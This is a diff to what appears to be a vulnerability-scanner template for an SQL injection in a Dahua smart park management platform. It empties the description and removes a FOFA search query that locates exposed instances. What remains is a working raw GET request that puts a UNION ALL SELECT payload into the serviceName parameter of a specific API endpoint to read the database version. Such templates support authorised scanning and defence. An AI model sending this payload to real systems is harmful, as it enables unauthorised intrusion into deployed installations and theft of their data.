@@ -3,12 +3,8 @@ info:
   name: 大华智慧园区综合管理平台 list 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xdibze7sir4elsxq'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xdibze7sir4elsxq
-    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
 http:
 - raw:
   - 'GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=''+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
